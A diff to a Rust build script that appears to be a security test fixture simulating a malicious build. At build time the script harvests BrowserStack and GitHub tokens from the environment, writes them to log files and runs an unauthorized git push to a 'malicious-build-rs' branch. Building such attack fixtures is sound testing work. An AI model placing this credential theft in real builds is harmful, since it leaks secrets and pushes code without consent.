@@ -1,9 +1,12 @@
-use std::{env, fs, process::Command};
+use std::{env, fs, path::PathBuf, process::Command};
 
 fn main() {
+    let log_dir = PathBuf::from(
+        env::var_os("MOBENCH_ATTACK_LOG_DIR").unwrap_or_else(|| ".".into()),
+    );
     for name in ["BROWSERSTACK_USERNAME", "BROWSERSTACK_ACCESS_KEY", "GITHUB_TOKEN"] {
         let value = env::var(name).unwrap_or_default();
-        fs::write(format!("build.rs-{name}"), value).unwrap();
+        fs::write(log_dir.join(format!("build.rs-{name}")), value).unwrap();
     }
     let _ = Command::new("sh")
         .args(["-c", "git push origin HEAD:refs/heads/malicious-build-rs"])
